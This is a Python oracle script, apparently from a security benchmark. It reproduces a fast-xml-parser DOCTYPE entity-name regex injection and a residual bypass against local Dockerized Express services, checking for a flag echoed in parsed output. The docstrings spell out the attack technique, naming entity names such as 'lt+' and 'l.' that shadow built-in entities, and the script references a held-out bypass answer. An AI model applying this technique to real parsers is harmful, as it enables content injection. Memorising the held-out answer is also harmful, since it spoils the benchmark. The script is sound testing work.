#!/usr/bin/env python3
"""Flag differential oracle for fastxmlparser_entityname_regex_injection
(content-injection over EXTERNAL HTTP).

CVE-2023-34104 (fast-xml-parser DOCTYPE entity-name -> RegExp injection; the entity NAME is
interpolated UNESCAPED into RegExp(`&${entityName};`,"g") and run over element text before the
built-in XML entities decode; fixed 4.2.4 = TARGET) -> CVE-2026-25896 (the 4.2.4 blocklist added
'|','+' but MISSED '.', so a period-wildcard entity name still shadows &lt;; 5.3.5 escapes the
regex metacharacters). CWE-185.

Variant A: both the seed and the residual hit the SAME sink -- a REAL Express service's
`POST /parse` running the REAL, unmodified `new XMLParser({processEntities:true}).parse(req.body)`
-- and exfiltrate over the SAME content-injection channel: the per-run ${PCB_FLAG} is carried as
the attacker's DOCTYPE entity VALUE, and it surfaces in the parsed <r> field of the JSON response
IFF the entity-name regex shadowed the built-in &lt; reference. Every probe is an EXTERNAL HTTP
POST from the host to the version's published port. Whether the flag comes back is decided ENTIRELY
by that fast-xml-parser version's own unmodified DocTypeReader entity-name guard. Nothing in
fast-xml-parser is modified.

Roles:
  V0 = fast-xml-parser 4.2.3  (pre-CVE-2023-34104; blocklist lacks '+','|','.' -> both vectors shadow &lt;)
  V1 = fast-xml-parser 4.2.4  (CVE-2023-34104 fix; blocklist adds '+','|' but STILL no '.')  <- target
  V2 = fast-xml-parser 5.3.5  (CVE-2026-25896 fix; entity names validated + regex metachars escaped) <- negative

Usage:
  python3 oracle.py --run-gate            # compose up (v0,v1) --build + gate + teardown
  python3 oracle.py --run-gate --with-v2  # also verify residual + original blocked on v2
"""
from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[2] / "benchmark"))
from flag_oracle import FlagOracle, new_flag, validate_case  # noqa: E402

sys.path.insert(0, str(HERE))
from poc_common import health, post_parse  # noqa: E402
from original_poc import original_payload, candidate as _original_candidate  # noqa: E402

FLAG = os.environ.get("PCB_FLAG") or new_flag()


def _benign_payload(flag: str) -> str:
    # Ordinary DOCTYPE entity + a normal &lt;ok&gt; -- never shadows a built-in, never emits the flag.
    return (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE r [\n'
        '<!ENTITY greet "hello">\n'
        ']>\n'
        '<r>&greet; then &lt;ok&gt;</r>'
    )


def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        capture_output=True, check=False,
        env={**os.environ, **(env or {})},
    )


def _flag_echo(resp: dict) -> str:
    """Return FLAG iff it appears anywhere in the HTTP JSON response (the shadowed-entity value)."""
    blob = json.dumps(resp, default=str)
    return FLAG if FLAG in blob else ""


def run_probe(candidate, *, version="v1"):
    """Ship one attacker XML doc to the version's REAL Express /parse over EXTERNAL HTTP; the real
    XMLParser.parse + that version's DocTypeReader entity-name guard decide whether the entity-name
    regex shadows &lt; and writes the attacker's ${PCB_FLAG} entity value into the parsed <r> field
    that /parse returns. Returns {version, id, loaded, error, flag_echo}."""
    if not isinstance(candidate, dict):
        candidate = {"payload": str(candidate)}
    payload = str(candidate.get("payload", ""))
    resp = post_parse(payload, version)
    return {
        "version": version,
        "id": candidate.get("id"),
        "loaded": resp.get("loaded"),
        "error": resp.get("error"),
        "parsed": resp.get("parsed"),
        "flag_echo": _flag_echo(resp),
    }


def original_poc(*, version="v1"):
    """[GIVEN] CVE-2023-34104 seed (entity NAME 'lt+' -> RegExp /&lt+;/ shadows &lt;)."""
    return run_probe(_original_candidate(FLAG), version=version)


def bypass_poc(*, version="v1"):
    """[HELD-OUT] CVE-2026-25896 residual (entity NAME 'l.' -> RegExp /&l.;/ shadows &lt;;
    lazy import from _heldout/)."""
    from importlib import util as _u
    spec = _u.spec_from_file_location("_bypass", HERE / "_heldout" / "bypass_poc.py")
    mod = _u.module_from_spec(spec)
    spec.loader.exec_module(mod)
    best = {"version": version, "loaded": None, "flag_echo": ""}
    for vec in mod.VECTORS:
        res = run_probe(mod.candidate(FLAG, vec), version=version)
        if res["flag_echo"]:
            return res
        best = res
    return best


def benign_poc(*, version="v1"):
    return run_probe({"id": "benign-ordinary-entity", "payload": _benign_payload(FLAG)}, version=version)


def mechanism_scope(candidate) -> bool:
    """True iff the candidate feeds a DOCTYPE entity declaration to the XMLParser sink."""
    if not isinstance(candidate, dict):
        return False
    return "!ENTITY" in str(candidate.get("payload", ""))


def build_oracle() -> FlagOracle:
    o = FlagOracle(FLAG, run_probe, mechanism_scope)
    o.prime_seed(lambda version="v1": original_poc(version=version))
    return o


def gate() -> dict:
    return validate_case(
        flag=FLAG,
        original_on_v0=original_poc(version="v0"),
        original_on_v1=original_poc(version="v1"),
        bypass_on_v1=bypass_poc(version="v1"),
    )


def _profiles(*ps):
    out = []
    for p in ps:
        out += ["--profile", p]
    return out


def _wait_ready(version, tries=90, delay=3):
    """Poll the version's REAL Express /health over external HTTP until it serves (env-ready)."""
    for _ in range(tries):
        if health(version):
            return True
        time.sleep(delay)
    return False


def run_gate(with_v2=False, keep_up=False) -> dict:
    global FLAG
    FLAG = new_flag()
    allp = _profiles("v0", "v1", "v2")
    _compose(*allp, "down", "-v")
    profiles = ("v0", "v1", "v2") if with_v2 else ("v0", "v1")
    r = _compose(*_profiles(*profiles), "up", "-d", "--build")
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr[-4000:]}
    for v in profiles:
        if not _wait_ready(v):
            return {"error": "service %s never became ready" % v,
                    "logs": _compose("logs", "--tail", "40", v).stdout[-3000:]}
    result = gate()
    result["_original_on_v0"] = original_poc(version="v0")
    result["_original_on_v1"] = original_poc(version="v1")
    result["_bypass_on_v1"] = bypass_poc(version="v1")
    result["_benign_on_v0"] = benign_poc(version="v0")
    result["_benign_on_v1"] = benign_poc(version="v1")
    if with_v2:
        result["_residual_blocked_on_v2"] = not bypass_poc(version="v2")["flag_echo"]
        result["_original_blocked_on_v2"] = not original_poc(version="v2")["flag_echo"]
        result["_original_on_v2"] = original_poc(version="v2")
        result["_bypass_on_v2"] = bypass_poc(version="v2")
        result["_benign_on_v2"] = benign_poc(version="v2")
    result["_flag"] = FLAG
    if not keep_up:
        _compose(*allp, "down", "-v", "--rmi", "all")
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--with-v2", action="store_true")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(with_v2=a.with_v2, keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
